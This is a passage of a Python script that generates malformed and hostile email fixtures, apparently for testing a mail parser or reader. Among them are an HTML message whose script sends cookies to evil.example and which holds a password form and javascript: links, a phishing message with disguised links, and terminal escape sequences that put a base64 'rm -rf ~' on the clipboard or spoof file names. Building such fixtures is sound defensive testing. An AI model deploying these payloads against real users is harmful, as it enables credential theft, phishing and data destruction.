Content-Type: multipart/alternative; boundary="inner-e"

--inner-e--
--e
Content-Type: text/plain

The only part with anything in it.
--e
Content-Type: image/png; name=""
Content-Disposition: attachment; filename=""
Content-ID: <>

--e--
""")

write("attachment-without-name", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: A file with no name
Date: Sat, 14 Nov 2026 10:15:00 +0000
Message-ID: <noname.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="nn"

--nn
Content-Type: text/plain

Two files follow, and neither says what it is called.
--nn
Content-Type: application/octet-stream
Content-Disposition: attachment
Content-Transfer-Encoding: base64

AAECAwQFBgcICQ==
--nn
Content-Disposition: attachment
Content-Transfer-Encoding: base64

3q2+7w==
--nn
Content-Type: application/x-unknown-thing; name="   "
Content-Disposition: attachment; filename="   "

spaces for a name
--nn--
""")

write("duplicate-conflicting-headers", """\
From: Ana Ruiz <ana.ruiz@example.com>
From: Someone Else <someone.else@example.net>
Sender: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
To: Priya Nair <priya.nair@example.com>
Subject: The first subject
Subject: The second subject
Date: Sat, 14 Nov 2026 10:16:00 +0000
Date: Mon, 01 Jan 2001 00:00:00 +0000
Message-ID: <dup.1@example.com>
Message-ID: <dup.2@example.com>
Reply-To: first.reply@example.com
Reply-To: second.reply@example.com
MIME-Version: 1.0
MIME-Version: 2.0
Content-Type: text/plain; charset=utf-8
Content-Type: text/html; charset=iso-8859-1
Content-Transfer-Encoding: 7bit
Content-Transfer-Encoding: base64
Content-Type: text/plain; charset=utf-8; charset=koi8-r; format=flowed; format=fixed

<p>Is this <b>HTML</b>, plain text or base64? The headers say all three.</p>
""")

write("missing-date-from-subject", """\
To: Robin Vale <robin@example.org>
X-Mailer: something that leaves things out

No date, no sender and no subject. The reader shows when it arrived.
""")

write("header-line-10kb", "From: Sam Lee <sam.lee@example.com>\nTo: Robin Vale <robin@example.org>\nX-Long: " + ("0123456789abcdef" * 640) + "\nReferences: " + " ".join(f"<ref.{n}@example.com>" for n in range(400)) + "\nSubject: After a header line of ten kilobytes\nDate: Sat, 14 Nov 2026 10:17:00 +0000\nMessage-ID: <long-header.1@example.com>\n\nThe subject comes after the long line and should still be found.\n")

write("body-line-2mb", "From: Sam Lee <sam.lee@example.com>\nTo: Robin Vale <robin@example.org>\nSubject: One line of two megabytes\nDate: Sat, 14 Nov 2026 10:18:00 +0000\nMessage-ID: <long-line.1@example.com>\nMIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n" + ("the same eight words over and over and over " * 47663)[:2 * 1024 * 1024])

write("nul-bytes", (
    b"From: Sam\x00 Lee <sam.lee@example.com>\r\n"
    b"To: Robin Vale <robin@example.org>\r\n"
    b"Subject: NUL\x00 bytes\x00\x00 in the subject\r\n"
    b"Date: Sat, 14 Nov 2026 10:19:00 +0000\r\n"
    b"Message-ID: <nul.1@example.com>\r\n"
    b"X-\x00Odd: header name with a NUL\r\n"
    b"Content-Type: multipart/mixed; boundary=\"nul\"\r\n\r\n"
    b"--nul\r\n"
    b"Content-Type: text/plain; charset=utf-8\r\n\r\n"
    b"Text with \x00 NUL \x00\x00 bytes in it, and a run:\x00\x00\x00\x00\x00\x00\x00\x00 end.\r\n"
    b"--nul\r\n"
    b"Content-Type: text/html; charset=utf-8\r\n\r\n"
    b"<p>HTML with \x00 a NUL <b>in\x00side</b> a t\x00ag: <a hr\x00ef=\"https://example.com/\x00a\">link</a></p>\r\n"
    b"--nul\r\n"
    b"Content-Type: application/octet-stream; name=\"nul\x00.bin\"\r\n"
    b"Content-Disposition: attachment; filename=\"nul\x00.bin\"\r\n\r\n"
    b"\x00\x01\x02\x03\r\n"
    b"--nul--\r\n"
), crlf=False)

write("bare-cr-and-bare-lf", (
    b"From: Sam Lee <sam.lee@example.com>\r"
    b"To: Robin Vale <robin@example.org>\n"
    b"Subject: Line endings of\r every kind\n"
    b"Date: Sat, 14 Nov 2026 10:20:00 +0000\r\n"
    b"Message-ID: <endings.1@example.com>\n\r"
    b"Content-Type: text/plain; charset=utf-8\r\n"
    b"\n"
    b"A line ended by a line feed alone.\n"
    b"A line ended by a carriage return alone.\r"
    b"A line ended by both.\r\n"
    b"A line ended the wrong way round.\n\r"
    b"Pay Ana 100\rPay Eve 900\r\r\r\n\n\n"
    b"The end.\r"
), crlf=False)

write("mixed-crlf-lf", (
    b"From: Sam Lee <sam.lee@example.com>\r\n"
    b"To: Robin Vale <robin@example.org>\n"
    b"Subject: Some lines end one way,\n some the other\r\n"
    b"Date: Sat, 14 Nov 2026 10:21:00 +0000\n"
    b"Message-ID: <mixed-endings.1@example.com>\r\n"
    b"MIME-Version: 1.0\n"
    b"Content-Type: multipart/mixed; boundary=\"mx\"\r\n"
    b"\n"
    b"--mx\n"
    b"Content-Type: text/plain; charset=utf-8\r\n"
    b"\r\n"
    b"First line, CRLF.\r\n"
    b"Second line, LF.\n"
    b"Third line, CRLF.\r\n"
    b"--mx\r\n"
    b"Content-Type: text/plain; name=\"unix.txt\"\n"
    b"Content-Disposition: attachment; filename=\"unix.txt\"\n"
    b"\n"
    b"one\ntwo\r\nthree\n"
    b"--mx--\n"
), crlf=False)

write("eight-bit-headers", (
    "From: Tomás Ortega <tomas.ortega@example.com>\r\n"
    "To: 陈静 <chen.jing@example.com>, \"Renée ☕\" <renee@example.org>\r\n"
    "Subject: Raw UTF-8 in a header: café, 日本語, 🎉\r\n"
).encode("utf-8") + (
    b"X-Latin-1: caf\xe9 \xe0 la carte \xa9 \xff\r\n"
    b"Comments: \x80\x81\xfe\xff bytes that are no encoding at all\r\n"
    b"Date: Sat, 14 Nov 2026 10:22:00 +0000\r\n"
    b"Message-ID: <8bit.1@example.com>\r\n"
    b"Content-Type: multipart/mixed; boundary=\"b8\"\r\n\r\n"
    b"--b8\r\n"
    b"Content-Type: text/plain; charset=utf-8\r\n\r\n"
    b"Headers are meant to be ASCII. These were not.\r\n"
    b"--b8\r\n"
) + "Content-Type: application/pdf; name=\"résumé de Tomás.pdf\"\r\nContent-Disposition: attachment; filename=\"résumé de Tomás.pdf\"\r\n".encode("utf-8") + (
    b"Content-Transfer-Encoding: base64\r\n\r\n"
    b"JVBERi0xLjQK\r\n"
    b"--b8\r\n"
    b"Content-Type: text/plain; name=\"caf\xe9.txt\"\r\n"
    b"Content-Disposition: attachment; filename=\"caf\xe9.txt\"\r\n\r\n"
    b"Latin-1 in a file name.\r\n"
    b"--b8--\r\n"
), crlf=False)

write("headers-only", "From: Ana Ruiz <ana.ruiz@example.com>\nTo: Robin Vale <robin@example.org>\nSubject: Nothing follows\nDate: Sat, 14 Nov 2026 10:23:00 +0000\nMessage-ID: <headers-only.1@example.com>")

write("headers-only-multipart", "From: Ana Ruiz <ana.ruiz@example.com>\nSubject: Promised parts, sent none\nDate: Sat, 14 Nov 2026 10:24:00 +0000\nMIME-Version: 1.0\nContent-Type: multipart/alternative; boundary=\"nothing\"\nContent-Transfer-Encoding: base64\n")

write("zero-length", b"", crlf=False)

write("not-a-message", (
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    b"\x00\x00\x00\rIDATx\xdacd`\xf8_\x0f\x00\x02\x87\x01\x80\xebG\xba\x92\x00\x00\x00\x00IEND\xaeB`\x82"
), crlf=False)

write("mbox-from-line", """\
From ana.ruiz@example.com Sat Nov 14 10:25:00 2026
From: Ana Ruiz <ana.ruiz@example.com>
To: Robin Vale <robin@example.org>
Subject: Saved from a mailbox file
Date: Sat, 14 Nov 2026 10:25:00 +0000
Message-ID: <mbox.1@example.com>
Status: RO
X-Status: A
Content-Length: 97

>From the mailbox format: a line that starts with "From " gets a marker
put in front of it.
>>From twice.
""")

write("address-oddities", """\
From: "Ruiz, Ana" (the one in Madrid) <ana.ruiz@example.com> (again)
Sender: <>
To: Friends: maya.okafor@example.com, Jo Park <jo.park@example.com>;,
 undisclosed-recipients:;, "unterminated <a@example.org>,
 <@relay.example.net,@other.example.net:route@example.org>,
 "quoted \\"inside\\" quotes" <q@example.org>, no-angle@example.org (Comment Name),
 Missing Bracket <mb@example.org, <<<double@example.org>>>, @, <>, ,,,
 "very.unusual.@.unusual.com"@example.com, user@[192.0.2.1], user@[IPv6:2001:db8::1]
Cc: =?UTF-8?Q?=22Quoted=2C_Encoded=22?= <qe@example.org>, a@b, x@@example.org,
 just-a-word, "" <empty.name@example.org>, <spaces in address@example.org>
Bcc:
Reply-To: (only a comment)
Subject: Addresses in every shape
Date: Sat, 14 Nov 2026 10:26:00 +0000
Message-ID: <addr.1@example.com>
In-Reply-To: no angle brackets at all <one@example.com> (comment) <two@example.com>
References: <one@example.com><two@example.com>,<three@example.com>
 <> < spaced@example.com > <<four@example.com>> five@example.com

Whoever these are, the message should open.
""")

write("date-oddities", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Date oddities
Date: Sat, 31 Feb 2026 25:61:61 +9999 (not a real moment)
Resent-Date: 14 Nov 26 10:27 GMT
Received: by mx.example.org; Thu, 01 Jan 1970 00:00:00 -0000
Received: by mx.example.org; Fri, 31 Dec 9999 23:59:59 +1400
Received: by mx.example.org; 99999999999999999999 Foo 99999999999999999999
Message-ID: <date.1@example.com>

The date above names a day and a time that do not exist.
""")

write("content-type-oddities", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Content types that are not
Date: Sat, 14 Nov 2026 10:28:00 +0000
Message-ID: <ct.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="ct"

--ct
Content-Type: text

Just "text".
--ct
Content-Type: /

A slash and nothing else.
--ct
Content-Type: text/plain; charset="utf-8; name=unterminated

A quote that never closes.
--ct
Content-Type: TEXT/PLAIN; CHARSET=UTF-8; =; ;;; x; y=; =z; a="b"c; name*=; name*0*=; name*99999999999999999999=x

Parameters of every wrong shape.
--ct
Content-Type: application/octet-stream;
\tname="tab folded.bin"
Content-Transfer-Encoding: x-no-such-encoding
Content-Disposition: attachment

Encoded some way nobody knows.
--ct
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: binary

Binary, with a NUL-free body.
--ct
Content-Type: text/plain/extra; charset = utf-8 ; format = flowed
Content-Transfer-Encoding:   QUOTED-PRINTABLE   (comment)

Spaces =3D everywhere.
--ct
Content-Type: application/x-very-""" + ("long-" * 400) + """type

A media type two kilobytes long.
--ct--
""")

write("cid-oddities", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Content ids that clash
Date: Sat, 14 Nov 2026 10:29:00 +0000
Message-ID: <cid.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/related; boundary="cid"

--cid
Content-Type: text/html; charset=utf-8

<p>Seven pictures, and not one content id that is as it should be.</p>
<p><img src="cid:same@example.com"> <img src="cid:"> <img src="cid:%"> <img src="cid:%zz%41"> <img src="cid:<same@example.com>">
<img src="cid:../../etc/passwd"> <img src="cid:a b"> <img src="cid:no-brackets"> <img src="cid:UPPER@EXAMPLE.COM"></p>
--cid
Content-Type: image/png
Content-ID: <same@example.com>
Content-Transfer-Encoding: base64

""" + PNG + """
--cid
Content-Type: image/gif
Content-ID: <same@example.com>
Content-Transfer-Encoding: base64

R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7
--cid
Content-Type: image/png
Content-ID: no-brackets
Content-Transfer-Encoding: base64

""" + PNG + """
--cid
Content-Type: image/png
Content-ID: <../../etc/passwd>
Content-Transfer-Encoding: base64

""" + PNG + """
--cid
Content-Type: image/png
Content-ID: <a b> <second@example.com> trailing words
Content-Transfer-Encoding: base64

""" + PNG + """
--cid
Content-Type: image/png
Content-ID: <upper@example.com>
Content-Transfer-Encoding: base64

""" + PNG + """
--cid--
""")

# ---------------------------------------------------------------- HTML

write("html-only", """\
From: Riverside Library <holds@example.org>
To: Robin Vale <robin@example.org>
Subject: Your hold is ready
Date: Sat, 14 Nov 2026 10:30:00 +0000
Message-ID: <hold.1@example.org>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 8bit

<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Your hold is ready</title>
<style>body { font-family: sans-serif } .small { color: #666; font-size: 12px }</style></head>
<body>
<h1>Your hold is ready</h1>
<p>Hello Robin,</p>
<p>The book you asked for, <em>The Sea, the Sea</em>, is waiting at the <b>Riverside</b> branch. We keep it for seven days.</p>
<ul><li>Pick up by: 21 November</li><li>Desk hours: 9 to 6</li></ul>
<p>You can <a href="https://example.org/holds/1042">manage your holds</a> or <a href="mailto:holds@example.org">write to us</a>.</p>
<p class="small">Riverside Library · 1 River Street</p>
</body>
</html>
""")

rows = "".join(
    f"<tr><td>{n}</td><td>Item {n} &amp; parts</td><td align=\"right\">{n * 3 % 97}.{n % 100:02d}</td><td>{'yes' if n % 3 else 'no'}</td><td><a href=\"https://example.com/items/{n}\">view</a></td><td>Note for row {n}</td></tr>\n"
    for n in range(1, 601))
write("html-giant-table", """\
From: Reports <reports@example.com>
To: Robin Vale <robin@example.org>
Subject: Stock report, 600 lines
Date: Sat, 14 Nov 2026 10:31:00 +0000
Message-ID: <table.1@example.com>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html><body><table border="1" cellpadding="2">
<thead><tr><th>#</th><th>Item</th><th>Cost</th><th>In stock</th><th>Link</th><th>Note</th></tr></thead>
<tbody>
""" + rows + """</tbody></table></body></html>
""")

write("html-5000-nested-divs", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Five thousand deep
Date: Sat, 14 Nov 2026 10:32:00 +0000
Message-ID: <deep.1@example.com>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

""" + "<div>" * 5000 + "The text at the bottom." + "</div>" * 5000 + "\n")

write("html-nested-tables-and-styles", """\
From: Sam Lee <sam.lee@example.com>
To: Robin Vale <robin@example.org>
Subject: Tables in tables, emphasis in emphasis
Date: Sat, 14 Nov 2026 10:33:00 +0000
Message-ID: <deep.2@example.com>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html><head><style>
""" + "".join(f".c{n} {{ color: #{n:06x}; margin: {n}px }}\n" for n in range(400)) + """
@media (max-width: 600px) { .c1 { display: none !important } }
td { padding: 0 } a[href^="https"] { color: red } p::before { content: "\\201C" }
</style></head><body>
""" + "<table><tr><td>" * 40 + "Forty tables deep." + "</td></tr></table>" * 40 + """
""" + "<b><i><u><s><em><strong><code><font color=\"red\"><span><small>" * 12 + "Emphasis, a hundred and twenty deep." + "</small></span></font></code></strong></em></s></u></i></b>" * 12 + """
""" + "<blockquote>" * 30 + "Quoted thirty times." + "</blockquote>" * 30 + """
""" + "<ul><li>" * 30 + "A list thirty deep." + "</li></ul>" * 30 + """
<p>""" + "<a href=\"https://example.com/a\">" * 50 + "Links in links." + "</a>" * 50 + """</p>
</body></html>
""")

write("html-hostile-script-style", """\
From: "Security Team" <security@mybank.example>
To: Robin Vale <robin@example.org>
Subject: Action required
Date: Sat, 14 Nov 2026 10:34:00 +0000
Message-ID: <hostile.1@evil.example>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html><head>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/landing">
<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'">
<link rel="stylesheet" href="https://evil.example/track.css">
<script src="https://evil.example/steal.js"></script>
<script>document.location = 'https://evil.example/?c=' + document.cookie</script>
<style>
@import url(https://evil.example/import.css);
@import "//evil.example/import2.css";
body { background: url(https://evil.example/bg.png) }
.a { background: URL( 'https://evil.example/a.png' ) }
.b { background: u\\72l(https://evil.example/b.png) }
.c { width: expression(steal()) }
@font-face { font-family: x; src: url(https://evil.example/font.woff2) }
</style>
<style>.d { color: red; background-image: url(//evil.example/d.png) }</style>
</head>
<body onload="steal()" background="https://evil.example/body.png">
<p onclick="steal()" style="background:url(https://evil.example/p.png)">Your account needs attention.</p>
<img src="x" onerror="steal()">
<img src="https://evil.example/pixel.gif?id=robin" width="1" height="1" alt="">
<img srcset="https://evil.example/1x.png 1x, https://evil.example/2x.png 2x" alt="Logo">
<a href="javascript:steal()">Click</a> <a href="jaVa&#9;sCript:steal()">here</a>
<a href="data:text/html;base64,PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+">or here</a>
<a href="file:///Applications/Calculator.app">or open this</a>
<a href="https://evil.example/login" onmouseover="steal()">https://www.mybank.example/login</a>
<form action="https://evil.example/collect" method="post">
<input type="text" name="user"><input type="password" name="password"><button>Sign in</button>
</form>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
<svg onload="steal()"><script>steal()</script><image href="https://evil.example/svg.png"/></svg>
<math><mi xlink:href="javascript:steal()">x</mi></math>
<video src="https://evil.example/v.mp4" poster="https://evil.example/poster.jpg" autoplay></video>
<noscript><img src="https://evil.example/noscript.gif"></noscript>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://evil.example/overlay.png')">Overlay</div>
<p>Unclosed <b>tags <i>everywhere <a href="https://evil.example/unclosed">
</body></html>
""")

write("newsletter-tracking-pixel", """\
From: Example Works News <news@example.com>
To: Robin Vale <robin@example.org>
Subject: =?UTF-8?Q?Black_Friday_starts_early_=F0=9F=8E=89?=
Date: Sat, 14 Nov 2026 10:35:00 +0000
Message-ID: <news.1@example.com>
List-Unsubscribe: <https://example.com/unsubscribe?u=robin>, <mailto:unsubscribe@example.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="news-1"

--news-1
Content-Type: text/plain; charset=utf-8

View this email in your browser: https://example.com/news/2026-11?u=robin
--news-1
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns=3D"http://www.w3.org/1999/xhtml"><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1">
<title>Black Friday starts early</title>
<style type=3D"text/css">
@media only screen and (max-width: 600px) { .column { width: 100% !important } }
.button { background: #1a1a1a; color: #ffffff; padding: 12px 24px }
</style></head>
<body style=3D"margin:0;padding:0;background-color:#f4f4f4">
<div style=3D"display:none;max-height:0;overflow:hidden">Up to 40% off, this week only.&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;</div>
<table role=3D"presentation" width=3D"100%" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td align=3D"center">
<table role=3D"presentation" width=3D"600" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" background=3D"https://cdn.example.com/bg.png">
<tr><td><a href=3D"https://click.example.com/t/abc123?u=3Drobin"><img src=3D"https://cdn.example.com/logo.png" alt=3D"Example Works" width=3D"160" height=3D"40" border=3D"0"></a></td></tr>
<tr><td style=3D"padding:24px;background-image:url(https://cdn.example.com/hero.jpg)">
<h1 style=3D"margin:0">Black Friday starts early.</h1>
<p>Everything in the shop is reduced until Sunday. <a class=3D"button" href=3D"https://click.example.com/t/def456?u=3Drobin">Shop the sale</a></p>
</td></tr>
<tr><td><table role=3D"presentation" width=3D"100%"><tr>
<td class=3D"column" width=3D"50%"><img src=3D"https://cdn.example.com/p1.jpg" alt=3D"Desk lamp" width=3D"280"><br>Desk lamp, 29.00</td>
<td class=3D"column" width=3D"50%"><img src=3D"https://cdn.example.com/p2.jpg" srcset=3D"https://cdn.example.com/p2@2x.jpg 2x" alt=3D"Notebook" width=3D"280"><br>Notebook, 9.00</td>
</tr></table></td></tr>
<tr><td style=3D"font-size:12px;color:#888888">You are receiving this because you signed up at example.com.
<a href=3D"https://example.com/unsubscribe?u=3Drobin">Unsubscribe</a> =C2=B7 <a href=3D"https://example.com/news/2026-11?u=3Drobin">View in browser</a></td></tr>
</table></td></tr></table>
<img src=3D"https://track.example.com/open.gif?m=3Dnews-1&u=3Drobin" width=3D"1" height=3D"1" alt=3D"" style=3D"display:none">
<img src=3D"https://track.example.net/pixel?id=3D987" width=3D"1" height=3D"1">
</body></html>
--news-1--
""")

write("phishing-disguised-link", """\
From: MyBank Security <security@mybank.example>
Reply-To: accounts@evil.example
To: Robin Vale <robin@example.org>
Subject: Your account has been limited
Date: Sat, 14 Nov 2026 10:36:00 +0000
Message-ID: <phish.1@evil.example>
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html><body>
<p>Dear customer,</p>
<p>We noticed unusual activity. Please confirm your details at
<a href="https://evil.example/mybank/login">https://www.mybank.example/login</a> within 24 hours.</p>
<p>You can also visit <a href="https://www.mybank.example.evil.example/">www.mybank.example</a>,
write to <a href="mailto:accounts@evil.example">support@mybank.example</a>,
or see <a href="https://myb&#x430;nk.example/">myb&#x430;nk.example</a>.</p>
<p>Honest links are left alone: <a href="https://www.example.com/help">example.com/help</a>,
<a href="https://example.org/">click here</a>.</p>
</body></html>
""")

write("winmail-dat", """\
From: Omar Haddad <omar.haddad@example.com>
To: Robin Vale <robin@example.org>
Subject: Minutes (sent from a program that wraps everything)
Date: Sat, 14 Nov 2026 10:37:00 +0200
Message-ID: <tnef.1@example.com>
X-MS-TNEF-Correlator: <tnef.1@example.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="tnef-1"

--tnef-1
Content-Type: text/plain; charset=utf-8

The minutes are attached.
--tnef-1
Content-Type: application/ms-tnef; name="winmail.dat"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="winmail.dat"

""" + b64(bytes([0x78, 0x9F, 0x3E, 0x22, 0x01, 0x00, 0x01, 0x06, 0x90, 0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x07, 0x90, 0x06, 0x00, 0x08, 0x00, 0x00, 0x00, 0xE4, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00] + list(b"minutes.doc\x00not a real attachment table") * 3)) + """
--tnef-1--
""")

# ---------------------------------------------------------------- terminal escapes

write("escape-sequences-subject", (
    f"From: Sam Lee <sam.lee@example.com>\r\n"
    f"To: Robin Vale <robin@example.org>\r\n"
    f"Subject: {ESC}]0;Terminal owned{BEL}{ESC}]52;c;cm0gLXJmIH4={BEL}Invoice{ESC}[2J{ESC}[H overdue{ESC}[1;31m{ESC}]8;;https://evil.example/{ESC}\\\r\n"
    f"Comments: \u009b2J\u009d0;title\u009c C1 forms\r\n"
    f"Date: Sat, 14 Nov 2026 10:40:00 +0000\r\n"
    f"Message-ID: <esc.subject{ESC}[0m@example.com>\r\n"
    f"In-Reply-To: <before{ESC}]0;x{BEL}@example.com>\r\n"
    f"References: <one{ESC}[31m@example.com> <two\x08\x7f@example.com>\r\n"
    f"\r\n"
    f"The subject of this message tries to retitle the window, write to the\r\n"
    f"clipboard, clear the screen and start a hyperlink.\r\n"
).encode("utf-8"), crlf=False)

hidden_name = base64.b64encode(f"{ESC}]8;;https://evil.example/{ESC}\\Your Bank{ESC}]8;;{ESC}\\{ESC}[2J".encode()).decode()
write("escape-sequences-sender-name", (
    f"From: =?UTF-8?B?{hidden_name}?= <sender@evil.example>\r\n"
    f"To: \"Robin{ESC}[31m Vale{BEL}\" <robin@example.org>, =?UTF-8?Q?=1B=5D0=3Bowned=07Sam_=1B=5B5mLee?= <sam.lee@example.com>\r\n"
    f"Cc: \"‮elaV niboR\" <rtl@example.org>, \"⁦isolated⁩ ‏Name\" <iso@example.org>, <esc{ESC}[1m@example.org>\r\n"
    f"Reply-To: =?UTF-8?Q?=9B31mEight-bit?= <reply@example.org>\r\n"
    f"Subject: =?UTF-8?Q?Encoded_=1B=5B2J=1B=5D0=3Bowned=07subject_=E2=80=AEtxt.exe?=\r\n"
    f"Date: Sat, 14 Nov 2026 10:41:00 +0000\r\n"
    f"Message-ID: <esc.name@example.com>\r\n"
    f"\r\n"
    f"The sender's name is an escape sequence in base64.\r\n"
).encode("utf-8"), crlf=False)

write("escape-sequences-file-name", (
    f"From: Sam Lee <sam.lee@example.com>\r\n"
    f"To: Robin Vale <robin@example.org>\r\n"
    f"Subject: Files with dangerous names\r\n"
    f"Date: Sat, 14 Nov 2026 10:42:00 +0000\r\n"
    f"Message-ID: <esc.file@example.com>\r\n"
    f"MIME-Version: 1.0\r\n"
    f"Content-Type: multipart/mixed; boundary=\"esc-f\"\r\n\r\n"
    f"--esc-f\r\n"
    f"Content-Type: text/plain; charset=utf-8\r\n\r\n"
    f"Four files. None is what its name pretends.\r\n"
    f"--esc-f\r\n"
    f"Content-Type: application/octet-stream; name=\"invoice‮fdp.exe\"\r\n"
    f"Content-Disposition: attachment; filename=\"invoice‮fdp.exe\"\r\n"
    f"Content-Transfer-Encoding: base64\r\n\r\n"
    f"TVqQAAMAAAAEAAAA\r\n"
    f"--esc-f\r\n"
    f"Content-Type: application/pdf; name=\"report{ESC}[2J{ESC}]0;owned{BEL}.pdf\"\r\n"
    f"Content-Disposition: attachment; filename=\"report{ESC}[2J{ESC}]0;owned{BEL}.pdf\"\r\n"
    f"Content-ID: <file{ESC}[31m@example.com>\r\n"
    f"Content-Transfer-Encoding: base64\r\n\r\n"
    f"JVBERi0xLjQK\r\n"
    f"--esc-f\r\n"
    f"Content-Type: application/zip\r\n"
    f"Content-Disposition: attachment; filename*=UTF-8''photos%1B%5B2J%E2%80%AEgpj.zip%00%07%0D%0A\r\n"
    f"Content-Transfer-Encoding: base64\r\n\r\n"
    f"UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==\r\n"
    f"--esc-f\r\n"
    f"Content-Type: text/plain; name=\"=?UTF-8?B?{base64.b64encode(f'notes{ESC}]52;c;cm0={BEL}⁧txt.scr⁩\ttab\nline'.encode()).decode()}?=\"\r\n"
    f"Content-Disposition: attachment; filename=\"=?UTF-8?B?{base64.b64encode(f'notes{ESC}]52;c;cm0={BEL}⁧txt.scr⁩\ttab\nline'.encode()).decode()}?=\"\r\n\r\n"
    f"A name with a tab and a line break hidden in base64.\r\n"
    f"--esc-f--\r\n"
).encode("utf-8"), crlf=False)

write("escape-sequences-body", (
    f"From: Sam Lee <sam.lee@example.com>\r\n"
    f"To: Robin Vale <robin@example.org>\r\n"
    f"Subject: Escapes in the body\r\n"
    f"Date: Sat, 14 Nov 2026 10:43:00 +0000\r\n"
    f"Message-ID: <esc.body@example.com>\r\n"
    f"MIME-Version: 1.0\r\n"
    f"Content-Type: multipart/alternative; boundary=\"esc-b\"\r\n\r\n"
    f"--esc-b\r\n"
    f"Content-Type: text/plain; charset=utf-8\r\n"
    f"Content-Transfer-Encoding: 8bit\r\n\r\n"
    f"{ESC}]0;Terminal owned{BEL}Dear Robin,{ESC}[2J{ESC}[3J{ESC}[H\r\n"
    f"{ESC}]52;c;cm0gLXJmIH4={BEL}Nothing was copied to your clipboard.\r\n"
    f"{ESC}]8;;https://evil.example/{ESC}\\https://www.mybank.example/{ESC}]8;;{ESC}\\ is a real link.\r\n"
    f"Pay Ana 100\rPay Eve 900\r\n"
    f"{ESC}[1;31mRed{ESC}[0m, {ESC}[?1049halternate screen, {ESC}c reset, {ESC}P1$r q{ESC}\\ device string.\r\n"
    f"Eight-bit: \u009b2J\u009d0;title\u009c\u0090x\u009c\u0085\u0080 done. Backspaces: secret\x08\x08\x08\x08\x08\x08public. Bell{BEL} DEL\x7f FF\x0c VT\x0b SO\x0e.\r\n"
    f"> {ESC}[31mquoted{ESC}[0m line with https://example.com/{ESC}[0m in it\r\n"
    f"-- \r\n"
    f"{ESC}[5mBlinking signature{ESC}[0m\r\n"
    f"--esc-b\r\n"
    f"Content-Type: text/html; charset=utf-8\r\n"
    f"Content-Transfer-Encoding: 8bit\r\n\r\n"
    f"<html><head><title>{ESC}]0;owned{BEL}</title></head><body>\r\n"
    f"<p>{ESC}]0;Terminal owned{BEL}Dear Robin,&#27;[2J&#x1b;[3J&#x1B;[H</p>\r\n"
    f"<p>&#27;]52;c;cm0gLXJmIH4=&#7;Nothing was copied to your clipboard.</p>\r\n"
    f"<p><a href=\"https://example.com/&#27;[31m\" title=\"&#27;]0;owned&#7;tip\">&#27;]8;;https://evil.example/&#27;\\A link&#27;]8;;&#27;\\</a></p>\r\n"
    f"<p>Pay Ana 100&#13;Pay Eve 900</p>\r\n"
    f"<pre>&#27;[1;31mRed&#27;[0m\t&#155;2J &#x9d;0;title&#x9c; &#8;&#8;&#127;&#12;&#11;&#14;&#0;</pre>\r\n"
    f"<img src=\"x.png\" alt=\"&#27;]0;owned&#7;A chart\">\r\n"
    f"<!-- {ESC}[2J --><script>{ESC}[2J</script><style>p::after {{ content: '{ESC}[2J' }}</style>\r\n"
    f"</body></html>\r\n"
    f"--esc-b--\r\n"
).encode("utf-8"), crlf=False)

write("escape-sequences-iso-2022-jp-lookalike", (
    b"From: Sam Lee <sam.lee@example.com>\r\n"
    b"To: Robin Vale <robin@example.org>\r\n"
    b"Subject: =?ISO-2022-JP?B?" + base64.b64encode(b"\x1b$B\x1b[2J\x1b]0;owned\x07\x1b(B plain \x1b[31m") + b"?=\r\n"
    b"Date: Sat, 14 Nov 2026 10:44:00 +0000\r\n"
    b"Message-ID: <esc.jp@example.com>\r\n"
    b"MIME-Version: 1.0\r\n"
